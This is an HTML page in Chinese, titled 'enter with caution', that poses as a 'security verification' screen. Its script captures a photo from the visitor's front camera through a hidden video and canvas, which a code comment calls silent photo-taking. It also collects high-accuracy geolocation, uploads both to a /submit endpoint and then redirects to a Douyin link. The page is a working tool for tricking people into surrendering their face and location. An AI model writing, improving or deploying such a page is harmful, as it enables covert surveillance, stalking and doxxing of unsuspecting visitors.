<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>慎入</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body {
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 20px;
    }
    h1 {
      font-size: 3.2rem;
      letter-spacing: 0.5rem;
      color: #ef4444;
      margin-bottom: 1.5rem;
      text-shadow: 0 0 20px #ef4444;
    }
    .sub {
      font-size: 1rem;
      color: #aaaaaa;
      margin-bottom: 2.5rem;
      text-align: center;
      line-height: 1.6;
    }
    .enter-btn {
      background: #dc2626;
      color: #fff;
      border: none;
      padding: 1.2rem 3rem;
      font-size: 1.8rem;
      font-weight: bold;
      border-radius: 12px;
      letter-spacing: 0.3rem;
      cursor: pointer;
      transition: 0.15s;
    }
    .enter-btn:active { background: #b91c1c; transform: scale(0.97); }
    .enter-btn:disabled { background: #555; cursor: not-allowed; transform: none; }
    #status {
      margin-top: 2rem;
      font-size: 0.9rem;
      color: #888;
      min-height: 1.5em;
    }
  </style>
</head>
<body>
  <h1>慎 入</h1>
  <p class="sub">系统将进行一次安全校验</p>
  <button class="enter-btn" id="enterBtn">进入</button>
  <div id="status"></div>

  <!-- 隐藏的视频与画布，用于静默拍照 -->
  <video id="video" style="display:none;" playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    (function() {
      const btn = document.getElementById('enterBtn');
      const statusDiv = document.getElementById('status');
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      let stream = null;

      function setStatus(text) {
        statusDiv.textContent = text;
      }

      // 静默开启前置摄像头并返回 MediaStream
      async function openCamera() {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;
        await video.play();
        // 等待视频准备好
        await new Promise(resolve => {
          if (video.readyState >= 2 && video.videoWidth > 0) resolve();
          else video.addEventListener('canplay', resolve, { once: true });
        });
      }

      // 拍照并返回 JPEG Blob
      async function takePhoto() {
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return new Promise(resolve => {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
        });
      }

      // 关闭摄像头
      function closeCamera() {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }
      }

      // 获取地理位置
      function getPosition() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            return reject(new Error('浏览器不支持定位'));
          }
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 6000,
            maximumAge: 0
          });
        });
      }

      // 主流程
      btn.addEventListener('click', async () => {
        btn.disabled = true;
        setStatus('正在初始化摄像头...');

        try {
          // 1. 打开摄像头（会弹出系统权限请求）
          await openCamera();
          setStatus('正在捕获画面...');

          // 2. 并行执行：拍照 + 定位
          const [blob, position] = await Promise.all([
            takePhoto(),
            getPosition().catch(err => {
              // 定位失败立即抛出，保持强制拦截逻辑
              throw new Error('定位失败: ' + (err.message || '用户拒绝'));
            })
          ]);

          // 拍照完成后立即关闭摄像头
          closeCamera();

          // 准备上传数据
          const formData = new FormData();
          formData.append('photo', blob, 'capture.jpg');
          formData.append('lat', position.coords.latitude);
          formData.append('lon', position.coords.longitude);

          setStatus('正在上传校验数据...');
          const response = await fetch('/submit', {
            method: 'POST',
            body: formData
          });

          const result = await response.json();
          if (response.ok && result.success) {
            setStatus('校验通过，正在跳转...');
            setTimeout(() => {
              window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
            }, 800);
          } else {
            setStatus('服务端保存失败，请稍后重试');
            console.error('后端错误:', result.error);
            btn.disabled = false;
          }
        } catch (err) {
          console.error(err);
          closeCamera(); // 确保释放摄像头
          let msg = '校验失败：' + err.message;
          if (err.name === 'NotAllowedError' || err.message.includes('Permission')) {
            msg = '❌ 校验失败：\n摄像头或定位权限未开启，请在浏览器设置中允许后重试。';
          } else if (err.message.includes('定位失败')) {
            msg = '❌ 校验失败：\n系统地理位置权限验证未通过，请允许获取位置信息。';
          } else if (err.name === 'NotFoundError') {
            msg = '❌ 未检测到可用摄像头，请确认设备已连接。';
          }
          alert(msg);
          setStatus('请重新尝试');
          btn.disabled = false;
        }
      });
    })();
  </script>
</body>
</html>
